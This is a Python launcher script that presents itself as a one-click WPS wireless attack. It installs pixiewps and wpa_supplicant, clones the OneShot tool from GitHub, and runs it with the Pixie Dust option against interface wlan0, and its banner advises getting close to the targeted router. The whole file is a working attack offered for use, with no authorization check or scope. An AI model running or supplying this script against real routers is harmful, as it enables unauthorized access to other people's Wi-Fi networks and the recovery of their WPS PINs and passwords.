import subprocess
import sys
import os
from pathlib import Path

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_header():
    print(f"{Colors.GREEN}{Colors.BOLD}")
    print("╔════════════════════════════════════════════════════════════╗")
    print("║     Lightest Oneclick Wireless pentesting wps attack       ║")
    print("║     No error, No Monitor mode! Just chill!!                ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print(f"{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}[📋] Instructions:{Colors.END}")
    print(" 1. Hi, it's TAIEF. Modified for automatic package install.")
    print(" 2. Detecting environment & checking tools...")
    print("")
    print(f"{Colors.YELLOW}[⚙️] ⚠️ Highly recommended:{Colors.END}")
    print("  • Before starting, Perform a restart on your device!")
    print("  • Turn off your device WiFi setting! Get closest to the targeted router!")

def run_cmd(cmd, cwd=None, shell=True, timeout=120, capture=True):
    """Run a shell command, return (returncode, stdout, stderr)."""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            cwd=cwd,
            capture_output=capture,
            text=True,
            timeout=timeout
        )
        return result.returncode, result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)

def is_termux():
    """Check if running inside Termux."""
    return os.path.isdir("/data/data/com.termux") or "PREFIX" in os.environ

def check_tools_installed():
    """Return True if pixiewps and wpa_supplicant (or wpa-supplicant) are already installed."""
    # Check for pixiewps
    code, _, _ = run_cmd("which pixiewps")
    if code != 0:
        return False
    # Check for wpa_supplicant or wpa-supplicant
    code1, _, _ = run_cmd("which wpa_supplicant")
    code2, _, _ = run_cmd("which wpa-supplicant")
    if code1 != 0 and code2 != 0:
        return False
    return True

def update_and_install_deps():
    """Update repos and install pixiewps + wpa_supplicant only if they are missing."""
    # If already installed, skip the whole process
    if check_tools_installed():
        print(f"{Colors.GREEN}[✅] pixiewps & wpa_supplicant already installed – skipping package installation.{Colors.END}")
        return True

    if is_termux():
        print(f"{Colors.BLUE}[📱] Termux detected - using pkg{Colors.END}")
        code, out, err = run_cmd("pkg update -y")
        if code != 0:
            print(f"{Colors.YELLOW}[⚠️] pkg update failed: {err}{Colors.END}")
            print(f"{Colors.YELLOW}[⚠️] Continuing anyway (you may already have the tools)...{Colors.END}")
            # Don't exit; maybe packages are there but can't update
        else:
            print(f"{Colors.GREEN}[✅] pkg updated{Colors.END}")

        print(f"{Colors.BLUE}[+] Installing root-repo (if needed)...{Colors.END}")
        code, out, err = run_cmd("pkg install root-repo -y")
        if code != 0:
            print(f"{Colors.YELLOW}[⚠️] root-repo may already be installed.{Colors.END}")

        print(f"{Colors.BLUE}[+] Installing pixiewps and wpa-supplicant...{Colors.END}")
        code, out, err = run_cmd("pkg install pixiewps wpa-supplicant -y")
        if code != 0:
            print(f"{Colors.RED}[❌] Failed to install tools: {err}{Colors.END}")
            return False
        print(f"{Colors.GREEN}[✅] pixiewps & wpa-supplicant installed{Colors.END}")
    else:
        print(f"{Colors.BLUE}[🐧] Linux detected - using apt{Colors.END}")
        code, out, err = run_cmd("sudo apt update -y")
        if code != 0:
            code, out, err = run_cmd("apt update -y")
        if code != 0:
            print(f"{Colors.YELLOW}[⚠️] apt update failed – continuing anyway.{Colors.END}")
        else:
            print(f"{Colors.GREEN}[✅] apt updated{Colors.END}")

        print(f"{Colors.BLUE}[+] Installing pixiewps and wpasupplicant...{Colors.END}")
        code, out, err = run_cmd("sudo apt install pixiewps wpasupplicant -y")
        if code != 0:
            code, out, err = run_cmd("apt install pixiewps wpasupplicant -y")
        if code != 0:
            print(f"{Colors.RED}[❌] Failed to install tools: {err}{Colors.END}")
            return False
        print(f"{Colors.GREEN}[✅] pixiewps & wpasupplicant installed{Colors.END}")

    return True

def git_clone_or_update(url):
    """Clone or update a repository."""
    repo_name = url.split("/")[-1].replace(".git", "")
    repo_dir = Path.cwd() / repo_name

    if repo_dir.exists():
        print(f"{Colors.YELLOW}[↻] {repo_name} already exists, updating...{Colors.END}")
        code, out, err = run_cmd(f"cd {repo_name} && git pull")
        if code != 0:
            print(f"{Colors.YELLOW}[⚠️] Could not update {repo_name}: {err}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[✅] {repo_name} updated{Colors.END}")
    else:
        print(f"{Colors.BLUE}[↓] Cloning {repo_name}...{Colors.END}")
        code, out, err = run_cmd(f"git clone {url}")
        if code != 0:
            print(f"{Colors.RED}[❌] Failed to clone {repo_name}: {err}{Colors.END}")
            return False
        else:
            print(f"{Colors.GREEN}[✅] {repo_name} cloned successfully{Colors.END}")
    return True

def run_oneshot():
    """Execute OneShot with --iface-down -K."""
    oneshot_dir = Path.cwd() / "OneShot"
    oneshot_script = oneshot_dir / "oneshot.py"

    if not oneshot_script.exists():
        print(f"\n{Colors.RED}❌ Error: oneshot.py not found at {oneshot_script}{Colors.END}")
        print("Check if OneShot was cloned correctly.")
        return False

    try:
        os.chdir(str(oneshot_dir))
        print(f"\n{Colors.GREEN}Executing OneShot...{Colors.END}")
        print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}")
        # Run with --iface-down and -K (PixieWPS attack)
        os.system("python3 oneshot.py -i wlan0 --iface-down -K")
    except Exception as e:
        print(f"{Colors.RED}❌ Error running OneShot: {e}{Colors.END}")
        return False
    return True

def main():
    print_header()

    # 1. Ensure tools are available (skip if already installed)
    if not update_and_install_deps():
        print(f"\n{Colors.RED}[❌] Package installation failed. Cannot continue.{Colors.END}")
        sys.exit(1)

    # 2. Clone OneShot
    oneshot_repo = "https://github.com/kimocoder/OneShot.git"
    if not git_clone_or_update(oneshot_repo):
        print(f"\n{Colors.RED}[❌] Failed to obtain OneShot.{Colors.END}")
        sys.exit(1)

    # 3. Run the attack
    run_oneshot()

    print(f"\n{Colors.GREEN}{Colors.BOLD}[✅] Script completed!{Colors.END}")
    print(f"{Colors.BLUE}You can manually run the tools from their respective directories.{Colors.END}")

if __name__ == "__main__":
    main()
